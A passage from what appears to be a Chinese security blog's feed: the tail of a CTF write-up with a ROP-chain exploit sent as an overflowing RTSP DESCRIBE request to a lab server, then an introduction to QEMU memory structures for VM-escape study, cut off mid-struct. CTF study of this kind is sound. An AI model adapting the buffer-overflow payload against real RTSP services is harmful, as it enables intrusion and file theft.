qwb\r\nCSeq: 2\r\nUser-Agent: fuck\r\n\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x000000000007b133</span>+baseaddr </span><br><span class="line">pop_rsi_ret=<span class="number">0x0000000000099fb0</span>+baseaddr </span><br><span class="line">pop_rdx_ret=<span class="number">0x0000000000019eaa</span>+baseaddr </span><br><span class="line">pop_rax_ret = <span class="number">0x0000000000035e4a</span>+baseaddr</span><br><span class="line">syscall = <span class="number">0x0000000000019eac</span>+baseaddr</span><br><span class="line"></span><br><span class="line">flag = baseaddr+<span class="number">0x7B3E5</span></span><br><span class="line"><span class="comment">#rop =pop_rax_ret+ p6(59)+ pop_rdi_ret + bin_sh + pop_rsi_ret + p64(0) + pop_rdx_ret + p64(0) + syscall_ret</span></span><br><span class="line"></span><br><span class="line">rop=p64(pop_rdi_ret)+p64(flag)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rax_ret)+p64(<span class="number">2</span>)+p64(syscall) <span class="comment">#open</span></span><br><span class="line">rop+=p64(pop_rdi_ret)+p64(<span class="number">6</span>)+p64(pop_rsi_ret)+p64(baseaddr+<span class="number">0x2A9990</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x60</span>)+p64(pop_rax_ret)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line">rop+=p64(pop_rdi_ret)+p64(<span class="number">5</span>)+p64(pop_rsi_ret)+p64(baseaddr+<span class="number">0x2A9990</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x60</span>)+p64(pop_rax_ret)+p64(<span class="number">1</span>)+p64(syscall)</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;DESCRIBE rtsp://192.168.127.133:8554/&#x27;</span> +<span class="string">b&quot;a&quot;</span>*<span class="number">198</span>+<span class="string">b&quot;/&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">198</span>+ <span class="string">b&#x27; RTSP/1.0\r\nvul_string:&#x27;</span> + <span class="string">b&#x27;\xa7&#x27;</span> *<span class="number">13</span> + rop + <span class="string">b&#x27;\r\nCSeq: 2\r\n\r\n&#x27;</span>)</span><br><span class="line">data=r()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>最后一步还有一个最关键的点就是循环时的数组下标其也是在溢出范围内的,所以溢出时需要对其进行恢复,否则就会出错</p><p>在有些wp中提到在进行其他操作之前,需要先进行一次<code>SETUP</code>方法调用,来拿到一个<code>session</code></p><p>但实际上这应该是常规协议的要求,因为题目代码的魔改,其实不用也行</p><p>此外还要注意这类与端口交互的题目,写flag都要写到sockfd上,这样才能被接收,至于如何找到这个fd,最简单粗暴的方法就是一个一个遍历了</p><h2 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h2><p>这类题目重点在于查找信息</p><p>找到关键的题目源码,协议使用标准</p><p>最后找到题目被修改后潜藏漏洞的点,否则纯靠逆向,狗都不逆了属于是</p><h1 id="simpleinterpreter"><a href="#simpleinterpreter" class="headerlink" title="simpleinterpreter"></a>simpleinterpreter</h1><p>一道解释器题目</p><p>看wp说github上有源码,可惜没找到</p><p>从字符串可以看出支持的功能有以下这些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000003FC800000065Cchar else enum if int return sizeof while read close printf malloc free memset memcmp exit void main</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">协议服务器类题目</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="协议" scheme="https://ixout.github.io/tags/%E5%8D%8F%E8%AE%AE/"/>
    
    <category term="server" scheme="https://ixout.github.io/tags/server/"/>
    
    <category term="rtsp" scheme="https://ixout.github.io/tags/rtsp/"/>
    
  </entry>
  
  <entry>
    <title>qemu-escape初识</title>
    <link href="https://ixout.github.io/posts/28098/"/>
    <id>https://ixout.github.io/posts/28098/</id>
    <published>2024-04-18T10:51:37.000Z</published>
    <updated>2024-05-03T11:24:22.665Z</updated>
    
    <content type="html"><![CDATA[<p><strong>参考:</strong></p><p><a href="https://xz.aliyun.com/t/6562?time__1311=n4%2BxnD0DRDBAi%3DGkDgiDlhjmYE%3Dx907Q2GlYD">qemu pwn-基础知识 - 先知社区 (aliyun.com)</a></p><p><a href="https://bbs.kanxue.com/thread-265501.htm">原创]QEMU逃逸初探-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://ctf-wiki.org/pwn/virtualization/qemu/basic-knowledge/mm/">QEMU 内存管理 - CTF Wiki (ctf-wiki.org)</a></p><p><a href="https://arttnbmy.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/">【HARDWARE.0x00】PCI 设备简易食用手册 - arttnbmy’s blog</a></p><p><a href="https://www.cnblogs.com/edver/p/14684143.html">QOM模型初始化流程 - Edver - 博客园 (cnblogs.com)</a></p><p><a href="https://www.owalle.com/2018/12/26/qemu-qom/">利用QOM(Qemu Object Model)创建虚拟设备 | Yi颗烂樱桃 (owalle.com)</a></p><p><a href="https://martins3.github.io/qemu/qom.html">QEMU 中的面向对象 : QOM | Deep Dark Fantasy (martins3.github.io)</a></p><h1 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h1><p>QEMU（Quick Emulator）是一个开源的虚拟机监控器和仿真器，可以在多种主机架构之间进行硬件级别的虚拟化。它允许用户在一台计算机上运行不同架构的操作系统，比如在x86架构的计算机上运行ARM架构的操作系统。QEMU可以模拟处理器、内存、存储设备、网络接口等硬件，并提供了一组工具和库来管理虚拟化环境。它被广泛用于开发、测试和调试操作系统、应用程序和嵌入式系统。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/876323_SFNDT7H88YVDYUK.jpg" alt=""></p><h2 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h2><h3 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h3><p>在虚拟机中不论是kvm还是qemu有几个关键的地址。</p><p>GVA：guest virtual address（虚拟机中的虚拟地址）</p><p>GPA：guest physical address（虚拟机中的物理地址）</p><p>HVA：host virtual address（宿主机中的虚拟地址）</p><p>HPA： host physical address（宿主机中的物理地址）</p><p>整体地址的话：从GVA -&gt; GPA -&gt; HVA -&gt; HPA 这样的转换。</p><p>而GPA实际是由宿主机进程mmap出来的空间。</p><p>而在qemu-kvm架构下，<strong>QEMU充当kvm的前端，传递IO。kvm负责做内存以及CPU的虚拟化。</strong></p><p>qemu进行会为虚拟机mmap分配出相应虚拟机申请大小的内存，用于给该虚拟机当作物理内存(在虚拟机进程中只会看到虚拟地址)</p><p>例如,qemu虚拟机对应的内存为1G，虚拟机启动后查看qemu的地址空间，可以看到存在一个大小为<code>0x40000000</code>内存空间，即为该虚拟机的物理内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fe37fe00000     0x7fe3bfe00000 rw-p 40000000 0 ;虚拟机对应的内存</span><br></pre></td></tr></table></figure><h3 id="GUEST视角"><a href="#GUEST视角" class="headerlink" title="GUEST视角"></a>GUEST视角</h3><h4 id="MemoryRegion"><a href="#MemoryRegion" class="headerlink" title="MemoryRegion"></a>MemoryRegion</h4><p>在 Qemu 当中使用 <code>MemoryRegion</code> 结构体类型来表示一块具体的 Guest 物理内存区域，该结构体定义于 <code>include/exec/memory.h</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** MemoryRegion:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 表示一块内存区域的一个结构体.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> global_locking;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    MemoryRegion *container;    <span class="comment">// 指向父 MemoryRegion</span></span><br><span class="line">    Int128 size;    <span class="comment">// 内存区域大小</span></span><br><span class="line">    hwaddr addr;    <span class="comment">// 在父 MR 中的偏移量</span></span><br><span class="line">    <span class="type">void</span> (*destructor)(MemoryRegion *mr);</span><br><span class="line">    <span class="type">uint64_t</span> align;</span><br><span class="line">    <span class="type">bool</span> terminates;</span><br><span class="line">    <span class="type">bool</span> ram_device;</span><br><span class="line">    <span class="type">bool</span> enabled;</span><br><span class="line">    <span class="type">bool</span> warning_printed; <span class="comment">/* For reservations */</span></span><br><span class="line">    <span class="type">uint8_t</span> vga_logging_count;</span><br><span class="line">    MemoryRegion *alias;    <span class="comment">// 仅在 alias MR 中，指向实际的 MR</span></span><br><span class="line">    hwaddr alias_offset;</span><br><span class="line">    <span class="type">int32_t</span> priority;</span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_nb;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 Qemu 当中有三种类型的 MemoryRegion：</p><ul><li>MemoryRegion 根：通过 <code>memory_region_init()</code> 进行初始化，其用以表示与管理由多个 sub-MemoryRegion 组成的一个内存区域，并不实际指向一块内存区域，例如 <code>system_memory</code>。</li><li>MemoryRegion 实体：通过 <code>memory_region_init_ram()</code> 初始化，表示具体的一块大小为 size 的内存空间，指向一块具体的内存。</li><li>MemoryRegion 别名：通过 <code>memory_region_init_alias()</code> 初始化，作为另一个 MemoryRegion 实体的别名而存在，不指向一块实际内存。</li></ul><p>MR 容器与 MR 实体间构成树形结构，其中容器为根节点而实体为子节点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">                       struct MemoryRegion</span><br><span class="line">                       +------------------------+                                         </span><br><span class="line">                       |name                    |                                         </span><br><span class="line">                       |  (const char *)        |                                         </span><br><span class="line">                       +------------------------+                                         </span><br><span class="line">                       |addr                    |                                         </span><br><span class="line">                       |  (hwaddr)              |                                         </span><br><span class="line">                       |size                    |                                         </span><br><span class="line">                       |  (Int128)              |                                         </span><br><span class="line">                       +------------------------+                                         </span><br><span class="line">                       |subregions              |                                         </span><br><span class="line">                       |    QTAILQ_HEAD()       |                                         </span><br><span class="line">                       +------------------------+                                         </span><br><span class="line">                                  |</span><br><span class="line">                                  |</span><br><span class="line">          ----+-------------------+---------------------+----</span><br><span class="line">              |                                         |</span><br><span class="line">              |                                         |</span><br><span class="line">              |                                         |</span><br><span class="line"></span><br><span class="line">struct MemoryRegion                            struct MemoryRegion</span><br><span class="line">+------------------------+                     +------------------------+</span><br><span class="line">|name                    |                     |name                    |</span><br><span class="line">|  (const char *)        |                     |  (const char *)        |</span><br><span class="line">+------------------------+                     +------------------------+</span><br><span class="line">|addr                    |                     |addr                    |</span><br><span class="line">|  (hwaddr)              |                     |  (hwaddr)              |</span><br><span class="line">|size                    |                     |size                    |</span><br><span class="line">|  (Int128)              |                     |  (Int128)              |</span><br><span class="line">+------------------------+                     +------------------------+</span><br><span class="line">|subregions              |                     |subregions              |</span><br><span class="line">|    QTAILQ_HEAD()       |                     |    QTAILQ_HEAD()       |</span><br><span class="line">+------------------------+                     +------------------------+</span><br></pre></td></tr></table></figure><p>相应地，基于 OOP 的思想，MemoryRegion 的成员函数被封装在函数表 <code>MemoryRegionOps</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Memory region callbacks</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegionOps</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 从内存区域上读. @addr 与 @mr 有关; @size 单位为字节. */</span></span><br><span class="line">    <span class="type">uint64_t</span> (*read)(<span class="type">void</span> *opaque,</span><br><span class="line">                     hwaddr addr,</span><br><span class="line">                     <span class="type">unsigned</span> size);</span><br><span class="line">    <span class="comment">/* 往内存区域上写. @addr 与 @mr 有关; @size 单位为字节. */</span></span><br><span class="line">    <span class="type">void</span> (*write)(<span class="type">void</span> *opaque,</span><br><span class="line">                  hwaddr addr,</span><br><span class="line">                  <span class="type">uint64_t</span> data,</span><br><span class="line">                  <span class="type">unsigned</span> size);</span><br><span class="line"></span><br><span class="line">    MemTxResult (*read_with_attrs)(<span class="type">void</span> *opaque,</span><br><span class="line">                                   hwaddr addr,</span><br><span class="line">                                   <span class="type">uint64_t</span> *data,</span><br><span class="line">                                   <span class="type">unsigned</span> size,</span><br><span class="line">                                   MemTxAttrs attrs);</span><br><span class="line">    MemTxResult (*write_with_attrs)(<span class="type">void</span> *opaque,</span><br><span class="line">                                    hwaddr addr,</span><br><span class="line">                                    <span class="type">uint64_t</span> data,</span><br><span class="line">                                    <span class="type">unsigned</span> size,</span><br><span class="line">                                    MemTxAttrs attrs);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">device_endian</span> <span class="title">endianness</span>;</span></span><br><span class="line">    <span class="comment">/* Guest可见约束: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 若非 0，则指定了超出机器检查范围的访问大小界限</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> min_access_size;</span><br><span class="line">        <span class="type">unsigned</span> max_access_size;</span><br><span class="line">        <span class="comment">/* If true, unaligned accesses are supported.  Otherwise unaligned</span></span><br><span class="line"><span class="comment">         * accesses throw machine checks.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">         <span class="type">bool</span> unaligned;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 若存在且 #false, 则该事务不会被设备所接受</span></span><br><span class="line"><span class="comment">         * (并导致机器的相关行为，例如机器检查异常).</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">bool</span> (*accepts)(<span class="type">void</span> *opaque, hwaddr addr,</span><br><span class="line">                        <span class="type">unsigned</span> size, <span class="type">bool</span> is_write,</span><br><span class="line">                        MemTxAttrs attrs);</span><br><span class="line">    &#125; valid;</span><br><span class="line">    <span class="comment">/* 内部应用约束: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 若非 0，则决定了最小的实现的 size .</span></span><br><span class="line"><span class="comment">         * 更小的 size 将被向上回绕，且将返回部分结果.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> min_access_size;</span><br><span class="line">        <span class="comment">/* 若非 0，则决定了最大的实现的 size . </span></span><br><span class="line"><span class="comment">         * 更大的 size 将被作为一系列的更小的 size 的访问而完成.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> max_access_size;</span><br><span class="line">        <span class="comment">/* 若为 true, 支持非对齐的访问.  </span></span><br><span class="line"><span class="comment">         * 否则所有的访问都将被转换为（可能多种）对齐的访问.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">bool</span> unaligned;</span><br><span class="line">    &#125; impl;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们的 Guest 要读写虚拟机上的内存时，在 Qemu 内部实际上会调用 <code>address_space_rw()</code>，对于一般的 RAM 内存而言则直接对 MR 对应的内存进行操作，对于 MMIO 而言则最终调用到对应的 <code>MR-&gt;ops-&gt;read()</code> 或 <code>MR-&gt;ops-&gt;write()</code>。</p><p>同样的，为了统一接口，在 Qemu 当中 <strong>PMIO 的实现同样是通过 MemoryRegion 来完成的</strong>，我们可以把一组端口理解为 QEMU 视角的一块 Guest 内存。</p><h4 id="FlatView"><a href="#FlatView" class="headerlink" title="FlatView"></a>FlatView</h4><p><code>FlatView</code> 用来表示<strong>一棵 MemoryRegion 树所表示的 Guest 地址空间</strong>，其使用一个 <code>FlatRange</code> 结构体指针数组来存储不同 <code>MemoryRegion</code> 对应的地址信息，每个 <code>FlatRange</code> 表示单个 <code>MemoryRegion</code> 的 <strong>Guest 视角的一块物理地址空间</strong>以及是否只读等特性信息， <code>FlatRange</code> 之间所表示的地址范围不会重叠。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Range of memory in the global map.  Addresses are absolute. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FlatRange</span> &#123;</span></span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line">    hwaddr offset_in_region;</span><br><span class="line">    AddrRange addr;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> readonly;</span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Flattened global view of current active memory hierarchy.  Kept in sorted</span></span><br><span class="line"><span class="comment"> * order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FlatView</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> ref;</span><br><span class="line">    FlatRange *ranges;</span><br><span class="line">    <span class="type">unsigned</span> nr;</span><br><span class="line">    <span class="type">unsigned</span> nr_allocated;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">AddressSpaceDispatch</span> *<span class="title">dispatch</span>;</span></span><br><span class="line">    MemoryRegion *root;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="AddressSpace"><a href="#AddressSpace" class="headerlink" title="AddressSpace"></a>AddressSpace</h4><p><code>AddressSpace</code> 结构体用以表示 <strong>Guest 视角不同类型的地址空间</strong>，在 x86 下其实就只有两种：<code>address_space_memory</code> 与 <code>address_space_io</code>。</p><p>单个 <code>AddressSpace</code> 结构体与一棵 MemoryRegion 树的根节点相关联，并使用一个 <code>FlatView</code> 结构体建立该树的平坦化内存空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct AddressSpace: describes a mapping of addresses to #MemoryRegion objects</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AddressSpace</span> &#123;</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    MemoryRegion *root;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Accessed via RCU.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">FlatView</span> *<span class="title">current_map</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ioeventfd_nb;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegionIoeventfd</span> *<span class="title">ioeventfds</span>;</span></span><br><span class="line">    QTAILQ_HEAD(, MemoryListener) listeners;</span><br><span class="line">    QTAILQ_ENTRY(AddressSpace) address_spaces_link;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><p>最终可以得到这样一张图:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-02_211734.png" alt=""></p><h3 id="HOST视角"><a href="#HOST视角" class="headerlink" title="HOST视角"></a>HOST视角</h3><h4 id="RAMBlock"><a href="#RAMBlock" class="headerlink" title="RAMBlock"></a>RAMBlock</h4><p>用于表示:<strong>MR 对应的 Host 虚拟内存</strong></p><p><code>RAMBlock</code> 结构体用来表示<strong>单个实体 MemoryRegion 所占用的 Host 虚拟内存信息</strong>，多个 <code>RAMBlock</code> 结构体之间构成单向链表。</p><p>比较重要的成员如下：</p><ul><li><code>mr</code>：该 RAMBlock 对应的 MemoryRegion（即 HVA → GPA）</li><li><code>host</code>：GVA 对应的 HVA，通常由 QEMU 通过 <code>mmap()</code> 获得（如果未使用 KVM）</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">RAMBlock</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> *<span class="title">mr</span>;</span></span><br><span class="line">    <span class="type">uint8_t</span> *host;</span><br><span class="line">    <span class="type">uint8_t</span> *colo_cache; <span class="comment">/* For colo, VM&#x27;s ram cache */</span></span><br><span class="line">    <span class="type">ram_addr_t</span> offset;</span><br><span class="line">    <span class="type">ram_addr_t</span> used_length;</span><br><span class="line">    <span class="type">ram_addr_t</span> max_length;</span><br><span class="line">    <span class="type">void</span> (*resized)(<span class="type">const</span> <span class="type">char</span>*, <span class="type">uint64_t</span> length, <span class="type">void</span> *host);</span><br><span class="line">    <span class="type">uint32_t</span> flags;</span><br><span class="line">    <span class="comment">/* Protected by iothread lock.  */</span></span><br><span class="line">    <span class="type">char</span> idstr[<span class="number">256</span>];</span><br><span class="line">    <span class="comment">/* RCU-enabled, writes protected by the ramlist lock */</span></span><br><span class="line">    QLIST_ENTRY(RAMBlock) next;</span><br><span class="line">    QLIST_HEAD(, RAMBlockNotifier) ramblock_notifiers;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">size_t</span> page_size;</span><br><span class="line">    <span class="comment">/* dirty bitmap used during migration */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *bmap;</span><br><span class="line">    <span class="comment">/* bitmap of already received pages in postcopy */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *receivedmap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * bitmap to track already cleared dirty bitmap.  When the bit is</span></span><br><span class="line"><span class="comment">     * set, it means the corresponding memory chunk needs a log-clear.</span></span><br><span class="line"><span class="comment">     * Set this up to non-NULL to enable the capability to postpone</span></span><br><span class="line"><span class="comment">     * and split clearing of dirty bitmap on the remote node (e.g.,</span></span><br><span class="line"><span class="comment">     * KVM).  The bitmap will be set only when doing global sync.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * It is only used during src side of ram migration, and it is</span></span><br><span class="line"><span class="comment">     * protected by the global ram_state.bitmap_mutex.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">NOTE:</span> this bitmap is different comparing to the other bitmaps</span></span><br><span class="line"><span class="comment">     * in that one bit can represent multiple guest pages (which is</span></span><br><span class="line"><span class="comment">     * decided by the `clear_bmap_shift&#x27; variable below).  On</span></span><br><span class="line"><span class="comment">     * destination side, this should always be NULL, and the variable</span></span><br><span class="line"><span class="comment">     * `clear_bmap_shift&#x27; is meaningless.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> 